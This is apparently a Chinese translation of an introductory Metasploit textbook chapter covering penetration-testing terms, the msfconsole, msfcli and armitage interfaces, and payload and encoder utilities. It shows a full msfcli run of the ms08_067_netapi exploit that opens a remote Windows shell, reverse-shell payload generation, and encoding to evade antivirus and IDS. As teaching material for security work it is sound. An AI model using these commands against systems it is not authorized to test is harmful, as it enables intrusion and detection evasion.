## 第二章. Metasploit 基础知识

当你第一次遇到 Metasploit 框架（MSF）时，你可能会被其众多界面、选项、实用程序、变量和模块所淹没。在本章中，我们将关注基础知识，这将帮助你理解整体情况。我们将回顾一些基本的渗透测试术语，然后简要介绍 Metasploit 提供的各种用户界面。Metasploit 本身是免费的开源软件，有许多安全社区的贡献者，但还有两个商业版本的 Metasploit 可供使用。

当首次使用 Metasploit 时，不要过于关注最新的利用；相反，关注 Metasploit 的功能以及你使用的命令是如何使利用成为可能的。

## 术语

在整本书中，我们将使用各种需要首先进行解释的术语。以下大多数基本术语都是在 Metasploit 的上下文中定义的，但它们在安全行业中通常是相同的。

### 利用

*利用* 是攻击者或渗透测试人员利用系统、应用程序或服务中的漏洞的手段。攻击者使用利用来攻击系统，以实现开发者从未意图实现的一种特定期望结果。常见的利用包括缓冲区溢出、Web 应用程序漏洞（如 SQL 注入）和配置错误。

### 负载

*负载* 是我们希望系统执行并由框架选择和传递的代码。例如，*反向 shell* 是一种负载，它从目标机器创建一个连接到攻击者的 Windows 命令提示符（见第五章），而*绑定 shell* 是一种将命令提示符“绑定”到目标机器上监听端口的负载，攻击者可以随后连接。负载也可以是目标操作系统上要执行的几个简单命令。

### Shellcode

*Shellcode* 是在利用过程中用作负载的一组指令。Shellcode 通常用汇编语言编写。在大多数情况下，目标机器执行了一系列指令后，会提供一个命令 shell 或 Meterpreter shell，因此得名。

### 模块

在本书的上下文中，*模块* 是可以由 Metasploit 框架使用的软件组件。有时，你可能需要使用*利用模块*，这是一个执行攻击的软件组件。在其他时候，可能需要*辅助模块*来执行扫描或系统枚举等操作。这些可互换的模块是使框架如此强大的核心。

### 监听器

*监听器* 是 Metasploit 中的一个组件，它等待某种类型的传入连接。例如，在目标机器被利用之后，它可能会通过互联网调用攻击机器。监听器处理这个连接，等待被利用的系统联系攻击机器。

## Metasploit 接口

Metasploit 提供了多个接口来访问其底层功能，包括控制台、命令行和图形界面。除了这些接口之外，实用程序还提供了直接访问通常在 Metasploit 框架内部的功能。这些实用程序对于利用程序开发和不需要整个框架灵活性的情况非常有价值。

### MSFconsole

*Msfconsole* 是迄今为止 Metasploit 框架最受欢迎的部分，原因很好。它是框架中最灵活、功能最丰富、支持最好的工具之一。*Msfconsole* 提供了一个方便的一站式界面，几乎涵盖了框架中可用的所有选项和设置；它就像是实现所有利用梦想的一站式商店。你可以使用 *msfconsole* 做任何事情，包括启动利用程序、加载辅助模块、执行枚举、创建监听器或对整个网络进行大规模利用。

尽管 Metasploit 框架不断变化，但其中一部分命令保持相对稳定。通过掌握 *msfconsole* 的基础知识，你将能够跟上任何变化。为了说明学习 *msfconsole* 的重要性，它将在本书的几乎每一章中都会被使用。

#### 启动 MSFconsole

要启动 *msfconsole*，请在命令行中输入 **`msfconsole`**：

```
root@bt:/# `cd /opt/framework3/msf3/`
root@bt:/opt/framework/msf3# `msfconsole`
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *
msf >
```

要访问 *msfconsole* 的帮助文件，请输入 **`help`** 后跟您感兴趣的命令。在下一个示例中，我们正在寻找关于 `connect` 命令的帮助，该命令允许我们与主机通信。生成的文档列出了用法、工具的描述以及各种选项标志。

```
msf > `help connect`
```

我们将在接下来的章节中更深入地探讨 MSFConsole。

### MSFcli

*Msfcli* 和 *msfconsole* 在提供对框架的访问方面采取了非常不同的方法。*msfconsole* 提供了一种交互式的方式来以用户友好的方式访问所有功能，而 *msfcli* 则将重点放在脚本化和与其他基于控制台的工具的可解释性上。*msfcli* 不是为框架提供一个独特的解释器，而是直接从命令行运行，这使得您可以将其他工具的输出重定向到 *msfcli*，并将 *msfcli* 的输出直接发送到其他命令行工具。*Msfcli* 还支持启动漏洞利用和辅助模块，当您确切知道需要哪些漏洞利用和选项时，它非常方便。如果您知道确切需要哪些漏洞利用和选项，它是一个独特的漏洞利用工具。与 *msfconsole* 相比，它不太宽容，但通过命令 `msfcli -h` 提供了一些基本帮助（包括用法和模式列表），如下所示：

```
root@bt:/opt/framework3/msf3# msfcli -h
Usage: /opt/framework3/msf3/msfcli <exploit_name> <option=value> [mode]
==============================================================================

   Mode           Description
   ----           ---------------
   (H)elp         You're looking at it, baby!
   (S)ummary      Show information about this module
   (O)ptions      Show available options for this module
   (A)dvanced     Show available advanced options for this module
   (I)DS Evasion  Show available ids evasion options for this module
   (P)ayloads     Show available payloads for this module
   (T)argets      Show available targets for this exploit module
   (AC)tions      Show available actions for this auxiliary module
   (C)heck        Run the check routine of the selected module
   (E)xecute      Execute the selected module

root@bt:/opt/framework3/msf3#
```

#### 示例用法

让我们看看您如何使用 *msfcli*。不用担心细节；这些示例旨在让您了解您如何与该界面一起工作。

当您刚开始学习 Metasploit 或遇到困难时，您可以通过在您卡住的字符串末尾附加字母 `O` 来查看模块中可用的选项。例如，在下面的列表中，我们使用 `O` 来查看 *ms08_067_netapi* 模块可用的选项：

```
root@bt:/# `msfcli windows/smb/ms08_067_netapi O`
[*] Please wait while we load the module tree...

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
```

您可以看到该模块需要三个选项：`RHOST`、`RPORT` 和 `SMPIPE`。现在，通过添加一个 `P`，我们可以检查可用的有效载荷：

```
root@bt:/# `msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P`
[*] Please wait while we load the module tree...

Compatible payloads
===================

   Name                                   Description
   ----                                   -----------
   generic/debug_trap                     Generate a debug trap in the target process
   generic/shell_bind_tcp                 Listen for a connection
 and spawn a command shell
```

在设置了漏洞利用所需的所有选项并选择了一个有效载荷后，我们可以通过将字母 `E` 传递到 *msfcli* 参数字符串的末尾来运行我们的漏洞利用，如下所示：

```
root@bt:/# `msfcli windows/smb/ms08_067_netapi`
 `RHOST=192.168.1.155 PAYLOAD=windows/shell/bind_tcp E`
[*] Please wait while we load the module tree...
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (NX)
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.1.101:46025 -> 192.168.1.155:4444)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

我们成功了，因为我们从远程系统收到了一个 Windows 命令提示符。

### Armitage

Metasploit 的 *armitage* 组件是由 Raphael Mudge 创建的一个完全交互式的图形用户界面。这个界面非常令人印象深刻，功能丰富，并且免费提供。我们不会深入介绍 *armitage*，但它确实值得提及，作为一项值得探索的内容。我们的目标是教授 Metasploit 的方方面面，一旦您了解了框架的实际操作方式，GUI 就非常棒。

#### 运行 Armitage

要启动 *armitage*，请运行命令 `armitage`。在启动过程中，选择**启动 MSF**，这将允许 *armitage* 连接到您的 Metasploit 实例。

```
root@bt:/opt/framework3/msf3# `armitage`
```

在 *armitage* 运行后，只需点击菜单即可执行特定的攻击或访问其他 Metasploit 功能。例如，图 2-1 显示了浏览器（客户端）漏洞利用。

![armitage 的浏览器漏洞菜单](img/00001.jpeg)图 2-1. armitage 的浏览器漏洞菜单

## Metasploit 工具

在介绍了 Metasploit 的三个主要界面之后，现在是时候介绍一些实用工具了。Metasploit 的实用工具是直接访问 Framework 特定功能的接口，在特定情况下非常有用，尤其是在漏洞开发中。在这里，我们将介绍一些更易于理解的实用工具，并在整本书中介绍更多的工具。

### MSFpayload

Metasploit 的 *msfpayload* 组件允许您生成用于漏洞利用的 shellcode、可执行文件以及更多内容，这些内容在 Framework 之外使用。

Shellcode 可以生成多种格式，包括 C、Ruby、JavaScript，甚至 Visual Basic for Applications。每种输出格式在各种情况下都很有用。例如，如果您正在使用基于 Python 的概念验证，C 风格的输出可能最好；如果您正在开发浏览器漏洞，JavaScript 输出格式可能最好。在获得所需的输出后，您可以轻松地将有效负载直接插入 HTML 文件中，以触发漏洞利用。

要查看该实用工具接受哪些选项，请在命令行中输入 **`msfpayload -h`**，如下所示：

```
root@bt:/# `msfpayload -h`
```

与 *msfcli* 一样，如果您在有效负载模块所需的选项上遇到困难，请在命令行上附加字母 `O`，以获取所需和可选变量的列表，如下所示：

```
root@bt:/# `msfpayload windows/shell_reverse_tcp O`
```

随着我们在后续章节中探索漏洞开发，我们将更深入地探讨 *msfpayload*。

### MSFencode

由 *msfpayload* 生成的 shellcode 完全可用，但它包含几个空字符，当许多程序解释时，这些空字符表示字符串的结尾，这将导致代码在完成前终止。换句话说，那些 `x00` 和 `xff` 可以破坏您的有效负载！

此外，以明文形式穿越网络的 shellcode 很可能被入侵检测系统（IDS）和防病毒软件捕获。为了解决这个问题，Metasploit 的开发者提供了 *msfencode*，它可以帮助您通过以不包含“坏”字符的方式编码原始有效负载来避免坏字符，并绕过防病毒和 IDS。输入 **`msfencode -h`** 查看一个 *msfencode* 选项列表。

Metasploit 包含针对特定情况的不同编码器。有些编码器在你只能使用字母数字字符作为有效负载的一部分时非常有用，例如在许多文件格式漏洞或其他只接受可打印字符作为输入的应用程序中，而其他编码器则是出色的通用编码器，在各种情况下都能很好地工作。

然而，如果您不确定，使用 *x86/shikata_ ga_nai* 编码器通常不会有错，这是唯一一个被评为优秀的编码器，优秀是衡量模块可靠性和稳定性的一个指标。在编码器的上下文中，优秀评级意味着它是最通用的编码器之一，并且可以比其他编码器提供更多的微调。要查看可用编码器的列表，将 `-l` 添加到 `msfencode`，如下所示。有效负载按可靠性顺序排列。

```
root@bt:˜# `msfencode -l`
```

### Nasm Shell

当你试图理解汇编代码时，*nasm_shell.rb* 工具会很有用，尤其是在开发漏洞利用时，你需要识别给定汇编命令的 *opcodes*（汇编指令）。

例如，这里我们运行工具并请求 `jmp esp` 命令的 opcodes，`nasm_shell` 告诉我们它是 FFE4。

```
root@bt:/opt/framework3/msf3/tools# `./nasm_shell.rb`

nasm > `jmp esp`
00000000  FFE4              jmp esp
```

## Metasploit Express 和 Metasploit Pro

Metasploit Express 和 Metasploit Pro 是 Metasploit 框架的商业化网络界面。这些实用程序提供了大量的自动化功能，使新用户更容易上手，同时仍然提供对框架的完全访问权限。这两个产品还提供了社区版框架中不可用的工具，例如自动密码破解和自动网站攻击。此外，Metasploit Pro 还提供了一个优秀的报告后端，可以加快渗透测试中最不受欢迎的方面之一：编写报告。

这些工具值得购买吗？只有你自己能做出这个选择。Metasploit 的商业版本是为专业渗透测试人员设计的，可以简化许多日常工作，但如果这些商业产品中的自动化功能为你节省了时间，那么它们可能足以证明购买价格是合理的。

然而，记住，随着你自动化工作，人类在识别攻击向量方面比自动化工具更出色。

## 总结

在本章中，你了解了一些 Metasploit 框架的基础知识。随着你继续阅读本书，你将开始以更高级的方式使用这些工具。你会发现使用不同的工具完成相同任务的不同方法。最终，将由你自己来决定哪个工具最适合你的需求。

现在你已经掌握了基础知识，让我们进入渗透测试过程的下一阶段：发现。
